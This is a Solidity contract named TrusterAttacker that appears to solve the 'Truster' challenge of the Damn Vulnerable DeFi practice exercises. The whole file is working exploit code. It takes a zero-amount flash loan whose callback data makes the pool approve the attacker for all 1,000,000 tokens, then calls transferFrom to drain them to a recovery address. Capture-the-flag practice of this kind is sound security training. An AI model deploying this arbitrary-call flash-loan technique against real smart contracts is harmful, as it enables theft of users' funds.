pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TrusterAttacker {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    function attack(address _pool, address _token, address _recovery) external {
        bytes memory data = abi.encodeWithSelector(
            DamnValuableToken(_token).approve.selector,
            address(this),
            TOKENS_IN_POOL
        );

        TrusterLenderPool(_pool).flashLoan(0, address(this), _token, data);

        DamnValuableToken(_token).transferFrom(
            _pool,
            _recovery,
            TOKENS_IN_POOL
        );
    }
}
